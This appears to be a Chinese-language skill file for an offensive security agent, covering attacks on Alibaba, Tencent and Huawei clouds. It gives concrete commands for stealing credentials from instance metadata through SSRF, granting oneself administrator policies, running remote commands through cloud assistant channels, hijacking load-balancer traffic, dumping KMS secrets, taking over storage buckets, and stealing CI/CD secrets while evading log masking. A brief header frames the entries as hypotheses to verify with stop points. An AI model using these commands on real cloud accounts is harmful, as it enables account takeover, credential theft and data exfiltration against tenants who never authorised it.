---
name: cloud-cn
description: 大爱仙尊·假设作业长文（cloud-cn）。先专卡后读本文。
---

> 作业先走 MAP.md 对应专卡。本文件是长文速查，不替代专卡。

# 国内云专项（阿里云 / 腾讯云 / 华为云）

> 仅在根路由选择本目录后读取。每个条目都是待验证的检查假设；执行前用当前一手证据确认适用性。
> 与 `cloud.md`（AWS/Azure/GCP/K8s）互补；本文件专注国内三大云**具体可验证的攻击路径**。
> **验证纪律**：IMDS→凭据类发现的低影响验证顺序（只读配置→静态分析→本地 mock→隔离环境）、强制停止点与证据脱敏见 `cloud.md` §"IMDS/云身份 低影响验证纪律"——国内云三条元数据路径同一套，凭据路径/跨租户/真实写入即停。

**触发**: 目标运行在阿里云/腾讯云/华为云，或 SSRF/代理已确认，需利用云元数据、AK/SK、控制台 API 接管云资产。

## 领域决策直觉

1. **国内云元数据 ≠ AWS**：阿里云 `100.100.100.200` 不强制 IMDSv2、腾讯云走 `169.254.0.23` 链路本地、华为云走 OpenStack 路径——很多 SSRF 防护只拦 AWS 的 `/latest/meta-data/`，这三条路径常被漏
2. **AK 前缀识别**：阿里云 `LTAI`、腾讯云 `AKIDz...`、华为云 AK/SK 由 IAM 凭据管理——先识别再选 CLI
3. **云助手/SSM 类 RCE 最隐蔽**：阿里云云助手、华为云/腾讯云对应通道走云 API 而不走 SSH——拿到 AK 即可命令执行，无端口暴露
4. 审计感知：ActionTrail（阿里）/CAM 审计记录 RAM/STS 变更——高价值操作前评估痕迹
5. 云存储桶先测 ACL/策略可写——AllUsers WRITE_ACP → FULL_CONTROL 接管，比爆破密钥更快

---

## 阿里云

### 元数据 STS 凭据（最高产）
- **信号**: SSRF/代理可达 `100.100.100.200`
- **验证**: `curl http://100.100.100.200/latest/meta-data/ram/security-credentials/ROLE_NAME` → 返回 `STS.` 开头临时凭据 → `aliyun configure --mode StsToken --access-key-id <AK> --access-key-secret <SK> --sts-token <Token>`
- **注意**: 先 `curl http://100.100.100.200/latest/meta-data/ram/security-credentials/` 列角色名；阿里不强制 IMDSv2，SSRF 危害大于 AWS
- **升级**: STS 凭据 → RAM 权限枚举 → 控制台/ECS/RDS 接管

### RAM 提权
- **验证**: `aliyun ram CreateAccessKey --UserName TARGET`（为他人建 AK）/ `aliyun ram AttachPolicyToUser --PolicyType System --PolicyName AdministratorAccess --UserName CURRENT`（给自己挂管理员策略）
- **升级**: 管理员 → ECS/RDS/ACK 全接管

### 云助手 RCE（类 AWS SSM，最隐蔽）
- **信号**: 拿到 ECS 相关 AK，无需 SSH 端口/密码
- **验证**: `aliyun ecs RunCommand --Type RunShellScript --CommandContent "id" --InstanceId.1 i-xxx` → `aliyun ecs DescribeInvocationResults` 取 Base64 输出
- **升级**: 命令执行 → 后渗透（免登录）

### 控制台接管链
- **VNC**: `aliyun ecs DescribeInstanceVncUrl` → 15 秒有效 VNC 控制台 URL
- **User-Data**: `aliyun ecs DescribeUserData` 提取初始化脚本（常含密码/密钥）
- **RDS**: `aliyun rds CreateAccount` + `GrantAccountPrivilege` 建高权限账号直连
- **SLB**: `aliyun slb AddBackendServers` 把攻击者 ECS 加权重 100 劫持流量
- **ACK**: `aliyun cs DescribeClusterUserKubeconfig` 拿 kubeconfig → 集群控制
- **KMS**: `aliyun kms GetSecretValue` 批量取凭据管家明文（db-password/api-key/ssh-private-key）
- **SLS**: 日志服务搜 `password OR secret OR token`
- **OSS**: `aliyun oss ls` / 见下方 Bucket 深度利用

---

## 腾讯云

### 元数据与凭据
- **验证**: 元数据域名 `metadata.tencentyun.com`（另有链路本地 `169.254.0.23`——只拦 169.254.169.254/100.100.100.200 的 SSRF 防护不充分）；SecretId 前缀 `AKIDz...` → `tccli configure` 配置后 `tccli sts GetCallerIdentity`
- **升级**: 凭据 → CAM 枚举 → CVM/COS/SCF 接管

### CAM 提权
- **验证**: `tccli cam CreateApiKey --TargetUin`（为他人建 API key）/ `tccli cam AttachUserPolicy --PolicyId 1`（PolicyId 1 = AdministratorAccess）
- **CVM**: `tccli cvm ResetInstancesPassword` 重置实例密码
- **SCF**: `tccli scf GetFunction --query 'Environment'` 读云函数环境变量（常含密钥）
- **VPC**: `tccli vpc CreateSecurityGroupPolicies` 开安全组

### COS 深度利用
- **关键**: 必须用 `coscmd`（`tccli cos GetService` 只能列桶，列对象/批量下载需 coscmd）；Bucket 名格式 `{name}-{appid}`
- **验证**: `coscmd config -a <SecretId> -s <SecretKey> -b <bucket-{appid}>` → `coscmd list` / `coscmd download -r <dir> ./`
- **升级**: 桶内容 → 敏感数据/密钥 → 横向

---

## 华为云

### 元数据（OpenStack 风格）
- **验证**: `http://169.254.169.254/openstack/latest/securitykey` —— 很多 SSRF 防护只拦 AWS `/latest/meta-data/` 路径，漏掉 openstack 路径
- **升级**: 凭据 → IAM/ECS 接管

### IAM 提权（Keystone）
- **验证**: `openstack group add user ADMIN_GROUP_ID CURRENT_USER_ID`（加入管理员组）/ REST `POST /v3.0/OS-CREDENTIAL/credentials` 为高权限用户建 AK/SK
- **CLI 三接口**: openstack CLI / obsutil（OBS）/ REST API + X-Auth-Token

---

## 云存储 Bucket 深度利用（OSS/COS/OBS 通用）

- **ACL 可写 → 接管**: 探测 `AllUsers` 是否有 `WRITE_ACP` → 构造 `FULL_CONTROL` ACL 写入（acl.xml/acl.json 模板）；Object ACL 可写同理
- **Bucket Policy 可写 → 放行**: 写 `Allow * s3:*` 策略（腾讯云用 `qcs::cam::anyone:anyone` 语法）
- **Bucket 接管**: CNAME 指向 S3/COS 但返回 `NoSuchBucket` → 在自己账号 `aws s3 mb` / `coscli mb cos://BUCKET-APPID`（腾讯云注意 APPID 匹配）/ `coscli presign` 生成预签名 URL
- **前缀遍历**: `?prefix=backup|config|.env`
- **Bucket 名称爆破**: 命名模式 `ORGNAME-backup/dev/...` 及 COS 特有 `ORGNAME-APPID`
- **验证指纹**: S3 `NoSuchBucket`(404) 才可接管；403（bucket 私有）≠ 漏洞

---

## CICD / Serverless（云侧增量）

### CI/CD 流水线攻击（拿到云仓库/流水线时）
- **PPE 三型判定**: D-PPE（直接改 workflow）/ I-PPE（改 Makefile/package.json 等被引用文件）/ 3PE（外部无写权限者）
- **`pull_request_target` 致命误用**: 基础分支上下文 + `ref: github.event.pull_request.head.sha` checkout PR 代码 = Secrets+写权限下执行攻击者代码；`issue_comment` 触发器同高危
- **Context Script Injection**: PR title/body 拼进 `run:` 时命令注入（表达式先渲染所以 shell 引号转义无效）
- **Secrets 窃取**: `env | base64`（双 base64 绕过日志掩码）/ `gcore`/`/proc/<pid>/mem` 读 Runner.Worker 明文
- **CI/CD→云**: OIDC Token `AssumeRoleWithWebIdentity` 穿越到云
- **Jenkins**: 读 `master.key` + `hudson.util.Secret` → 解密 credentials.xml 所有凭据

### Serverless 攻击
- **事件注入**: API Gateway 事件 `queryStringParameters`/`body`/`headers`/`pathParameters` 注入（SQL/NoSQL/反序列化/路径遍历）；S3/OSS 触发器 `event['key']` 拼接路径 → 路径遍历
- **环境变量提取**: DB_PASSWORD/DATABASE_URL/AWS_ACCESS_KEY_ID 等（SCF 读 `Environment`）
- **Lambda Layer 劫持**: 改共享 Layer 影响所有引用函数
- **/tmp 热启动**: 保留环境用于内网扫描

---

## 云 AK/SK 验证与利用（跨云通用）

- **验证**: `aliyun sts GetCallerIdentity` / `tccli sts GetCallerIdentity` / `aws sts get-caller-identity` → 确认身份与权限
- **枚举**: `enumerate-iam`/`cloudsplaining` 识别过度权限 → 权限提升路径（见 cloud.md）
- **AK 泄露源**: GitHub/Gitee 搜索 `"target.com" AKID`/`LTAI` → APK/小程序反编译翻 AKSK → JS bundle 硬编码 → `.env` 泄露（见 recon.md/web.md）
